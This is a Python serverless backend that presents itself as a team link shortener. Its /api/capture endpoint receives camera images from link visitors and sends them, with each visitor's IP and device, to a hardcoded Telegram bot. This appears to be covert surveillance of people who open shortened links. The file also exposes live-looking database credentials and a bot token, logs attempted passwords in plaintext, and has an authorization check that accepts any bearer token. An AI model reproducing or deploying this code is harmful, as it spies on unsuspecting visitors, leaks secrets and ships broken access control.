import json
import os
from datetime import datetime
import random
import string
from pymongo import MongoClient
import requests
import base64
import time
import traceback

# MongoDB Connection
MONGO_URI = "mongodb+srv://Anish_Gupta:Anish_Gupta@linkshortner.huk3frj.mongodb.net/?appName=LinkShortner&retryWrites=true&w=majority"
client = MongoClient(MONGO_URI)
db = client.link_shortener
links_collection = db.links

# Constants
PASSWORD = "@35678"
TELEGRAM_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
TELEGRAM_CHAT_ID = "6673230400"

def send_telegram_message(message):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram message error: {e}")
        return False

def send_telegram_photo(image_data, caption=""):
    """Send photo to Telegram bot"""
    try:
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('capture.jpg', base64.b64decode(image_data))}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        
        response = requests.post(url, files=files, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        error_msg = f"Telegram photo error: {str(e)}"
        send_telegram_message(f"📸 Photo Send Failed:\n{error_msg}")
        return False

def generate_short_code(length=6):
    """Generate random short code"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def handler(event, context):
    """Main handler for Netlify Functions"""
    
    # Set CORS headers
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Content-Type': 'application/json'
    }
    
    # Handle OPTIONS request for CORS
    if event['httpMethod'] == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': headers,
            'body': ''
        }
    
    path = event['path']
    method = event['httpMethod']
    
    try:
        if event.get('body'):
            body = json.loads(event['body'])
        else:
            body = {}
    except Exception as e:
        # Send error to Telegram
        error_msg = f"JSON Parse Error: {str(e)}\nPath: {path}\nBody: {event.get('body', '')[:500]}"
        send_telegram_message(f"❌ API Error:\n{error_msg}")
        body = {}
    
    try:
        # Route handling
        if path == '/api/verify' and method == 'POST':
            password = body.get('password', '')
            user_agent = event['headers'].get('user-agent', 'Unknown')
            ip = event['headers'].get('x-forwarded-for', 'Unknown').split(',')[0]
            
            if password == PASSWORD:
                # Send login success to Telegram
                login_msg = f"✅ Successful Login\n"
                login_msg += f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                login_msg += f"🌐 IP: {ip}\n"
                login_msg += f"📱 User Agent: {user_agent[:100]}"
                send_telegram_message(login_msg)
                
                # Generate auth token
                token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                
                return {
                    'statusCode': 200,
                    'headers': headers,
                    'body': json.dumps({
                        'success': True,
                        'redirect': '/dashboard',
                        'token': token,
                        'message': 'Login successful!'
                    })
                }
            else:
                # Send failed login attempt to Telegram
                failed_msg = f"❌ Failed Login Attempt\n"
                failed_msg += f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                failed_msg += f"🌐 IP: {ip}\n"
                failed_msg += f"🔑 Password Attempt: {password}"
                send_telegram_message(failed_msg)
                
                return {
                    'statusCode': 401,
                    'headers': headers,
                    'body': json.dumps({'success': False, 'message': 'Incorrect password!'})
                }
        
        elif path == '/api/shorten' and method == 'POST':
            # Check authorization
            auth_token = event['headers'].get('authorization', '')
            if not auth_token.startswith('Bearer '):
                return {
                    'statusCode': 401,
                    'headers': headers,
                    'body': json.dumps({'success': False, 'message': 'Unauthorized'})
                }
            
            original_url = body.get('url', '')
            if not original_url:
                return {
                    'statusCode': 400,
                    'headers': headers,
                    'body': json.dumps({'success': False, 'message': 'URL is required'})
                }
            
            # Generate short code
            short_code = generate_short_code()
            
            # Save to MongoDB
            link_data = {
                'short_code': short_code,
                'original_url': original_url,
                'created_at': datetime.now().isoformat(),
                'click_count': 0,
                'created_by': 'team'
            }
            
            links_collection.insert_one(link_data)
            
            site_url = event['headers'].get('origin', 'https://your-site.netlify.app')
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({
                    'success': True,
                    'short_url': f"{site_url}/l/{short_code}",
                    'short_code': short_code
                })
            }
        
        elif path == '/api/links' and method == 'GET':
            # Check authorization
            auth_token = event['headers'].get('authorization', '')
            if not auth_token.startswith('Bearer '):
                return {
                    'statusCode': 401,
                    'headers': headers,
                    'body': json.dumps({'success': False, 'message': 'Unauthorized'})
                }
            
            # Get recent links
            links = list(links_collection.find().sort('created_at', -1).limit(20))
            
            # Convert ObjectId to string
            for link in links:
                link['_id'] = str(link['_id'])
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True, 'links': links})
            }
        
        elif path == '/api/capture' and method == 'POST':
            image_data = body.get('image', '')
            user_agent = event['headers'].get('user-agent', 'Unknown')
            ip = event['headers'].get('x-forwarded-for', 'Unknown').split(',')[0]
            
            if image_data:
                caption = f"📸 Camera Capture\n"
                caption += f"🕐 Time: {datetime.now().strftime('%H:%M:%S')}\n"
                caption += f"🌐 IP: {ip}\n"
                caption += f"📱 Device: {user_agent[:50]}"
                send_telegram_photo(image_data, caption)
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True})
            }
        
        elif path == '/api/check-auth' and method == 'GET':
            auth_token = event['headers'].get('authorization', '')
            if auth_token.startswith('Bearer '):
                token = auth_token.replace('Bearer ', '')
                # In a real app, validate the token
                return {
                    'statusCode': 200,
                    'headers': headers,
                    'body': json.dumps({'authenticated': True})
                }
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'authenticated': False})
            }
        
        elif path == '/api/get-link' and method == 'GET':
            short_code = event.get('queryStringParameters', {}).get('code', '')
            link = links_collection.find_one({'short_code': short_code})
            
            if link:
                # Increment click count
                links_collection.update_one(
                    {'short_code': short_code},
                    {'$inc': {'click_count': 1}}
                )
                
                link['_id'] = str(link['_id'])
                return {
                    'statusCode': 200,
                    'headers': headers,
                    'body': json.dumps({'found': True, 'link': link})
                }
            else:
                return {
                    'statusCode': 404,
                    'headers': headers,
                    'body': json.dumps({'found': False, 'message': 'Link not found'})
                }
        
        elif path == '/api/log-error' and method == 'POST':
            error_data = body.get('error', {})
            error_msg = f"🚨 Frontend Error\n"
            error_msg += f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            error_msg += f"🌐 Page: {error_data.get('page', 'Unknown')}\n"
            error_msg += f"📱 User Agent: {event['headers'].get('user-agent', 'Unknown')[:100]}\n"
            error_msg += f"❌ Error: {error_data.get('message', 'Unknown error')}\n"
            error_msg += f"📍 Location: {error_data.get('location', 'Unknown')}"
            
            send_telegram_message(error_msg)
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True})
            }
        
        else:
            return {
                'statusCode': 404,
                'headers': headers,
                'body': json.dumps({'success': False, 'message': 'Endpoint not found'})
            }
    
    except Exception as e:
        # Send any server error to Telegram
        error_details = traceback.format_exc()
        error_msg = f"🔥 Server Error:\n"
        error_msg += f"Path: {path}\n"
        error_msg += f"Method: {method}\n"
        error_msg += f"Error: {str(e)}\n"
        error_msg += f"Traceback:\n{error_details[:1000]}"
        
        send_telegram_message(error_msg)
        
        return {
            'statusCode': 500,
            'headers': headers,
            'body': json.dumps({
                'success': False,
                'message': 'Internal server error',
                'error': str(e)
            })
                                  }
